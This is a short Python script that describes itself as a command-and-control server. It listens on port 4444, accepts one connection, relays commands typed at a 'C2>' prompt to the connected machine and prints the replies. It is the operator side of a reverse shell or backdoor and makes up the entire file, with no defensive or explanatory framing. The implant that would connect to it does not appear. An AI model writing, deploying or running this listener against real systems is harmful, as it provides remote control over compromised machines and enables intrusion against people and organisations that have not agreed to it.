#!/usr/bin/env python3
import socket
import threading

def handle_client(client_socket, address):
    print(f"[+] Connection from {address}")
    
    while True:
        try:
            command = input("C2> ")
            client_socket.send(command.encode())
            
            if command.lower() == 'exit':
                break
                
            response = client_socket.recv(4096).decode()
            print(f"\n{response}\n")
        except Exception as e:
            print(f"[-] Error: {e}")
            break
    
    client_socket.close()

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 4444))
    server.listen(5)
    
    print("[*] C2 Server listening on port 4444")
    
    client, address = server.accept()
    handle_client(client, address)

if __name__ == "__main__":
    start_server()